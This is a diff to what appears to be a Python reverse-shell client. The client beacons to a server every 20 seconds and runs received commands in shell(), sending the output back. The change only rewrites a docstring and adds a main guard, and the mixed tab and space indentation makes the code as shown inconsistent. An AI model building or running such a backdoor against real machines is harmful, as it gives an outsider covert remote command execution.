@@ -8,7 +8,7 @@ import time
 
 
 def connection():
-	"""Function that will allow client to connect to server. This Function will attempt to beacon back to the server at specified interval default=20 seconds for testing"""
+    """Responsible for making connection to server. Will continue to connect every 20 seconds by default"""
     while True:
         time.sleep(20)
 	try:
@@ -83,7 +83,7 @@ def shell():
             results = proc.stdout.read() + proc.stderr.read()
             send(results)
 
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection()
-sock.close()
+if __name__ == "__main__":
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connection()
+    sock.close()
